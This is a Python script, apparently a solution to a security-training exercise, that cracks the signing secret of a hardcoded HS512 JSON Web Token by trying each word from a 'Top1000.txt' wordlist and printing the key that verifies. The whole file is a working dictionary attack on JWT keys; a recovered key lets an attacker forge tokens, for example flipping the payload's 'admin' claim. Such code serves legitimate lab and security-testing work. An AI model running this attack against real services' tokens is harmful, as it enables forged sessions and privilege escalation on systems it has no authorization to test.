import jwt
import termcolor
if __name__ == "__main__":
    jwt_str = R'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1Njk3MjI2NDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.Y2WgbXt9wjv4p4BdM_tA9f05sG-_n1ugojijOZMXx2_Gld_Ip4dOazj9K3iWVC68W_7_HEyu2_c0qSjtqDC0Vg'
    with open('Top1000.txt') as f:
        for line in f:
            key_ = line.strip()
            try:
                jwt.decode(jwt_str, verify=True, key=key_)
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except jwt.exceptions.InvalidSignatureError:
                print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
                continue
        else:
            print('\r', '\bsorry! no key be found.')
